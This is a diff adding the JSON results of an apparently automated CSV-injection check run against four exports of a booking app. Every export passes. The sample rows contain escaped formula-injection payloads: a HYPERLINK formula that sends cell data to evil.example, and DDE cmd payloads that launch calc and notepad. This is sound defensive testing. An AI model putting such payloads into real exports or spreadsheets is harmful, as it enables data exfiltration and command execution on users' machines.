@@ -1,0 +1,186 @@
+{
+  "summary": {
+    "check": "csv-injection-check",
+    "repo": "/private/tmp/claude-501/-Users-stevengoumnai/bb2b640e-7b18-457e-a6a2-5f7dc74f6ad1/scratchpad/bp2-copy/all",
+    "exports": 4,
+    "failed": 0,
+    "netAttempts": 0,
+    "result": "PASS"
+  },
+  "results": [
+    {
+      "export": "bookings",
+      "status": 200,
+      "rows": 1,
+      "pass": true,
+      "problems": [],
+      "sample": [
+        [
+          "id",
+          "createdAt",
+          "customer_name",
+          "phone",
+          "address",
+          "issue",
+          "date",
+          "window",
+          "urgency",
+          "status",
+          "outcome",
+          "customerType",
+          "channel",
+          "notes",
+          "unsure",
+          "consent.at",
+          "consent.channel",
+          "setup_check"
+        ],
+        [
+          "c303dce8c7",
+          "2026-11-10T20:27:06.888Z",
+          "'=HYPERLINK(\"https://evil.example/?x=\"&A1,\"Click\")",
+          "+17135550123",
+          "'-2+3",
+          "'@SUM(1+1)",
+          "2026-11-13",
+          "8 to 12",
+          "this_week",
+          "booked",
+          "booked",
+          "new",
+          "web",
+          "'=cmd|' /C calc'!A0",
+          "'+cmd|' /C notepad'!A0",
+          "2026-11-10T20:27:06.889Z",
+          "web",
+          ""
+        ]
+      ]
+    },
+    {
+      "export": "leads",
+      "status": 200,
+      "rows": 1,
+      "pass": true,
+      "problems": [],
+      "sample": [
+        [
+          "id",
+          "createdAt",
+          "customer_name",
+          "phone",
+          "address",
+          "issue",
+          "reason",
+          "outcome",
+          "urgency",
+          "wanted",
+          "status",
+          "channel",
+          "unsure",
+          "setup_check"
+        ],
+        [
+          "d1afc5331f",
+          "2026-11-10T20:27:06.891Z",
+          "'=HYPERLINK(\"https://evil.example/?x=\"&A1,\"Click\")",
+          "+17135550124",
+          "'-2+3",
+          "'@SUM(1+1)",
+          "lead",
+          "needs_action",
+          "flexible",
+          "'=1+1",
+          "open",
+          "web",
+          "'=1+1",
+          ""
+        ]
+      ]
+    },
+    {
+      "export": "customers",
+      "status": 200,
+      "rows": 2,
+      "pass": true,
+      "problems": [],
+      "sample": [
+        [
+          "First name",
+          "Last name",
+          "Mobile Phone",
+          "Email",
+          "Street",
+          "City",
+          "State",
+          "Zip Code",
+          "Note",
+          "Lead Source",
+          "Tags"
+        ],
+        [
+          "'=HYPERLINK(\"https://evil.example/?x=\"&A1,\"Click\")",
+          "",
+          "+17135550123",
+          "",
+          "'-2+3",
+          "Houston",
+          "TX",
+          "",
+          "'@SUM(1+1) (refs c303dce8c7)",
+          "Other",
+          "front desk"
+        ],
+        [
+          "'=HYPERLINK(\"https://evil.example/?x=\"&A1,\"Click\")",
+          "",
+          "+17135550124",
+          "",
+          "'-2+3",
+          "Houston",
+          "TX",
+          "",
+          "'@SUM(1+1) (refs d1afc5331f)",
+          "Other",
+          "front desk"
+        ]
+      ]
+    },
+    {
+      "export": "conversations",
+      "status": 200,
+      "rows": 6,
+      "pass": true,
+      "problems": [],
+      "sample": [
+        [
+          "channel",
+          "contact",
+          "at",
+          "role",
+          "content",
+          "flag_note",
+          "processing"
+        ],
+        [
+          "web",
+          "wcsv3",
+          "2026-11-10T20:27:06.891Z",
+          "user",
+          "'=HYPERLINK(\"https://evil.example/?x=\"&A1,\"Click\")",
+          "",
+          ""
+        ],
+        [
+          "web",
+          "wcsv3",
+          "2026-11-10T20:27:06.891Z",
+          "user",
+          "' =cmd|' /C calc'!A0",
+          "",
+          ""
+        ]
+      ]
+    }
+  ]
+}
